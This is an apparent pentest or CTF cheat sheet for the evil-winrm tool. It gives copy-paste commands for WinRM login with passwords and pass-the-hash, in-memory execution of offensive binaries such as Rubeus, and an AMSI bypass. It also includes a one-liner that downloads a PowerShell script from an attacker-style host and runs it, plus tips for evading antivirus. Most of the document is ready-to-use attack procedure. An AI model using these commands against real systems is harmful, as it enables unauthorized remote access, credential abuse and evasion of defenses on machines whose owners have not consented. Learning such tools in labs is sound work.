# evil-winrm — the WinRM shell

> **The nicest Windows shell you'll get.** If port **5985** (HTTP) or **5986** (HTTPS) is open and you have creds/hash, this is your first move. Real PowerShell, upload/download built in, Invoke-Binary for memory execution.

**Install check (Parrot — already installed):** `evil-winrm --help`

---

## 🎯 Cheat-flow: "What do I run?"

| You need to... | Run this |
|---|---|
| **Login with password** | `evil-winrm -i <IP> -u user -p 'pass'` |
| **Login with NTLM hash (PtH)** | `evil-winrm -i <IP> -u user -H <NT-hash>` |
| HTTPS (port 5986) | `evil-winrm -i <IP> -u user -p pass -S` |
| Custom port | `evil-winrm -i <IP> -u u -p p -P 5985` |
| Upload a file | `upload /path/local.exe C:\Temp\local.exe` (inside shell) |
| Download a file | `download C:\Users\admin\flag.txt` |
| Run a local binary in memory | `Invoke-Binary /path/tool.exe` |
| Load a local PS1 | `-s ./scripts/` then `Bypass-4MSI; <script>` |
| List PS scripts dir | passed via `-s <dir>` |

---

## 🔑 Flags you must know cold

| Flag | Meaning |
|---|---|
| `-i <IP>` | **Target host** |
| `-u <user>` | Username |
| `-p <pass>` | Password |
| `-H <hash>` | **NT hash** (Pass-the-Hash) |
| `-S` | Use **HTTPS** (5986) |
| `-P <port>` | Custom port |
| `-s <dir>` | Directory of PS scripts to load on start |
| `-e <dir>` | Directory of executables for `Invoke-Binary` |
| `-c <cert>` | Certificate auth — public key |
| `-k <key>` | Certificate auth — private key |
| `-r <realm>` | Kerberos realm |
| `-l` | Log session |
| `-N` | No colors |
| `-n` | No banner |

---

## 🧪 In-shell menu commands

Once you're in the shell, evil-winrm adds these beyond plain PowerShell:

| Cmd | Meaning |
|---|---|
| `menu` | Toggle the helper menu |
| `upload <local> <remote>` | Push a file to target |
| `download <remote> [local]` | Pull a file |
| `services` | List services |
| `Invoke-Binary <path>` | Run an EXE from `-e` dir in memory |
| `Donut-Loader <path>` | Donut-encode + reflective exec |
| `Bypass-4MSI` | Patch AMSI in current session |
| `exit` | Leave |

---

## 📋 Command recipes (copy-paste)

```bash
# 1. Standard password login
evil-winrm -i 10.10.10.5 -u 'Administrator' -p 'Password123'

# 2. Pass-the-Hash (just the NT half)
evil-winrm -i 10.10.10.5 -u 'Administrator' \
  -H '31d6cfe0d16ae931b73c59d7e0c089c0'

# 3. HTTPS (5986) + ignore cert
evil-winrm -i 10.10.10.5 -u user -p pass -S

# 4. With scripts + binaries preloaded
evil-winrm -i 10.10.10.5 -u user -p pass \
  -s /opt/ps/ -e /opt/bin/

# 5. Inside shell: upload a tool and run it
*Evil-WinRM* PS> upload /opt/bin/winPEASx64.exe
*Evil-WinRM* PS> .\winPEASx64.exe

# 6. Inside shell: memory-exec a local binary
*Evil-WinRM* PS> Invoke-Binary /opt/bin/Rubeus.exe

# 7. Inside shell: bypass AMSI before running scripts
*Evil-WinRM* PS> Bypass-4MSI
*Evil-WinRM* PS> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/ps.ps1')

# 8. Confirm WinRM is open first
nmap -p 5985,5986 -sV <IP>
crackmapexec winrm <IP> -u user -p pass
```

---

## ⚠️ Gotchas

- **WinRM must be enabled** on target. Default ports **5985 (HTTP)** and **5986 (HTTPS)**. Confirm with nmap.
- **Account needs to be in `Remote Management Users`** or be a local admin. Standard users → access denied.
- **PtH works** only when the hash is a **local** admin or has WinRM rights. If domain user, the NT hash alone still works (no LM needed).
- **Hash format:** evil-winrm wants **NT only**, no `LM:` prefix. Strip everything before the colon.
- **Upload path** must be absolute Windows style: `C:\Temp\file.exe`.
- **HTTPS self-signed cert?** `-S` ignores it by default — fine.
- **No tab-completion for files** — type full paths.
- **Running binaries from disk** may hit AV — use `Invoke-Binary` to run from memory.
- **Special chars in password** — single-quote the whole `-p` value.

---

## 🔗 Related

- [crackmapexec](./crackmapexec.md) — spray WinRM creds / confirm access
- [impacket](./impacket.md) — `psexec.py` / `wmiexec.py` as alternatives
- [nmap](./nmap.md) — `-p 5985,5986 -sV`
- [windows-playbook](../playbooks/windows-playbook.md)
